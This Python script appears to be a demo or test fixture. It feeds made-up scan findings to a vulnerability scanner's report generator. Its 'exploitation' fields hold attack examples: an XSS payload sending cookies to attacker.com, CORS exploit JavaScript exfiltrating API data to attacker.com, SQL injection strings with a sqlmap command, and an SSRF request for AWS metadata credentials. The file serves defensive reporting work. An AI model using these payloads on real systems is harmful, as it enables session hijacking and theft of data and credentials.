import asyncio
import sys
sys.path.insert(0, '.')

from datetime import datetime
from core.models import ScanResult, Vulnerability, Severity, SubdomainInfo, PortInfo
from core.reporter import Reporter

async def main():
    result = ScanResult(target="https://test-target.com")
    result.start_time = datetime.now()

    # Technologies
    result.technologies = ["nginx/1.18", "PHP 8.1", "WordPress 6.4", "jQuery", "Bootstrap"]

    # Subdomains
    result.subdomains = [
        SubdomainInfo(subdomain="api.test-target.com",     ip="1.2.3.4",  status=200),
        SubdomainInfo(subdomain="admin.test-target.com",   ip="1.2.3.5",  status=403),
        SubdomainInfo(subdomain="staging.test-target.com", ip="1.2.3.6",  status=200),
        SubdomainInfo(subdomain="mail.test-target.com",    ip="1.2.3.7",  status=None),
    ]

    # Open ports
    result.open_ports = [
        PortInfo(port=22,   protocol="tcp", state="open", service="ssh",        version="OpenSSH 8.2"),
        PortInfo(port=80,   protocol="tcp", state="open", service="http",       version="nginx/1.18"),
        PortInfo(port=443,  protocol="tcp", state="open", service="https",      version="nginx/1.18"),
        PortInfo(port=3306, protocol="tcp", state="open", service="mysql",      version="MySQL 8.0"),
        PortInfo(port=6379, protocol="tcp", state="open", service="redis",      version=None),
    ]

    # Endpoints
    result.endpoints = [
        "https://test-target.com/api/v1/users",
        "https://test-target.com/admin",
        "https://test-target.com/api/graphql",
        "https://test-target.com/.env",
    ]

    # Vulnerabilities
    result.vulnerabilities = [
        Vulnerability(
            vuln_type="SQL Injection",
            url="https://test-target.com/search?q=test",
            severity=Severity.CRITICAL,
            cvss_score=9.8,
            title="SQL Injection (Error-Based) — q parameter",
            description="The 'q' parameter is vulnerable to SQL injection. The server returned a SQL error message.",
            evidence="SQL error: 'You have an error in your SQL syntax near...'\nPayload: ' OR 1=1--",
            exploitation="sqlmap -u 'https://test-target.com/search?q=test' -p q --dbs --batch",
            remediation="1. Use prepared statements\n2. Use an ORM\n3. Apply input validation",
            parameter="q",
            payload_used="' OR 1=1--",
            curl_poc="curl -s \"https://test-target.com/search?q=' OR 1=1--\"",
            cwe_id="CWE-89",
            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
        ),
        Vulnerability(
            vuln_type="Information Disclosure",
            url="https://test-target.com/.env",
            severity=Severity.CRITICAL,
            cvss_score=9.5,
            title=".env File Exposed Publicly",
            description=".env file is exposed. Database credentials, API keys are visible.",
            evidence="HTTP 200 OK\nDB_PASSWORD=supersecret123\nAWS_SECRET=AKIAIOSFODNN7EXAMPLE",
            exploitation="curl https://test-target.com/.env",
            remediation="1. Remove .env file from web root\n2. Nginx: location ~ /\\.env { deny all; }",
            curl_poc="curl -s https://test-target.com/.env",
            cwe_id="CWE-538",
        ),
        Vulnerability(
            vuln_type="XSS",
            url="https://test-target.com/search?q=<script>alert(1)</script>",
            severity=Severity.HIGH,
            cvss_score=7.2,
            title="Reflected XSS — q parameter",
            description="The input in the 'q' parameter is reflected in the response without HTML encoding.",
            evidence="Payload '<script>alert(1)</script>' found in response",
            exploitation="Send this URL to the victim:\nhttps://test-target.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
            remediation="1. Use htmlspecialchars()\n2. Add a CSP header",
            parameter="q",
            payload_used="<script>alert(1)</script>",
            curl_poc="curl -s \"https://test-target.com/search?q=<script>alert(1)</script>\"",
            cwe_id="CWE-79",
            references=["https://portswigger.net/web-security/cross-site-scripting"],
        ),
        Vulnerability(
            vuln_type="CORS Misconfiguration",
            url="https://test-target.com/api/v1/users",
            severity=Severity.HIGH,
            cvss_score=8.1,
            title="CORS Arbitrary Origin Reflection + Credentials",
            description="The server reflects the sent Origin back as-is. Combined with Allow-Credentials: true, this allows critical data theft.",
            evidence="Request Origin: https://evil.com\nResponse ACAO: https://evil.com\nAllow-Credentials: true",
            exploitation="var req = new XMLHttpRequest();\nreq.open('GET', 'https://test-target.com/api/v1/users', true);\nreq.withCredentials = true;\nreq.onload = function() {\n  fetch('https://attacker.com/steal?d=' + encodeURIComponent(this.responseText));\n};\nreq.send();",
            remediation="1. Create an origin whitelist\n2. Don't reflect arbitrary origins\n3. Add a Vary: Origin header",
            curl_poc="curl -H \"Origin: https://evil.com\" -I \"https://test-target.com/api/v1/users\" | grep -i access-control",
            cwe_id="CWE-346",
        ),
        Vulnerability(
            vuln_type="SSRF",
            url="https://test-target.com/fetch?url=http://169.254.169.254/latest/meta-data/",
            severity=Severity.CRITICAL,
            cvss_score=9.8,
            title="SSRF — url parameter [AWS Metadata]",
            description="Server makes request to the URL in 'url' parameter. Can reach AWS metadata endpoint — IAM credentials steal risk!",
            evidence="AWS metadata indicator: 'instance-id' found",
            exploitation="AWS credentials theft:\ncurl 'https://test-target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nGet the role name, then get the credentials.",
            remediation="1. Apply a URL whitelist\n2. Block requests to internal IP ranges\n3. Use IMDSv2",
            parameter="url",
            curl_poc="curl -s \"https://test-target.com/fetch?url=http://169.254.169.254/latest/meta-data/\"",
            cwe_id="CWE-918",
        ),
        Vulnerability(
            vuln_type="Missing Security Header",
            url="https://test-target.com",
            severity=Severity.MEDIUM,
            cvss_score=5.3,
            title="Missing Content-Security-Policy",
            description="No CSP header. No additional protection against XSS attacks.",
            evidence="Header 'content-security-policy' missing from response",
            exploitation="Without a CSP, XSS payloads execute freely.",
            remediation="Content-Security-Policy: default-src 'self'; script-src 'self'",
            cwe_id="CWE-693",
        ),
        Vulnerability(
            vuln_type="Open Redirect",
            url="https://test-target.com/login?next=https://evil.com",
            severity=Severity.MEDIUM,
            cvss_score=6.1,
            title="Open Redirect — next parameter",
            description="The 'next' parameter allows redirecting to an arbitrary URL.",
            evidence="HTTP 302\nLocation: https://evil.com",
            exploitation="Send this link to the victim:\nhttps://test-target.com/login?next=https://evil.com",
            remediation="1. Apply whitelist for redirect\n2. Use relative path",
            parameter="next",
            curl_poc="curl -v \"https://test-target.com/login?next=https://evil.com\" 2>&1 | grep Location",
            cwe_id="CWE-601",
        ),
        Vulnerability(
            vuln_type="Information Disclosure",
            url="https://test-target.com",
            severity=Severity.LOW,
            cvss_score=2.0,
            title="Server Version Disclosure",
            description="Server header reveals version info.",
            evidence="Server: nginx/1.18.0",
            exploitation="Version info can be used for targeted exploit.",
            remediation="nginx: server_tokens off;",
            cwe_id="CWE-200",
        ),
    ]

    result.end_time = datetime.now()

    reporter = Reporter()
    paths = await reporter.save_all(result)
    print("\nReport ready:")
    print(f"HTML: {paths['html']}")
    print(f"JSON: {paths['json']}")


if __name__ == "__main__":
    asyncio.run(main())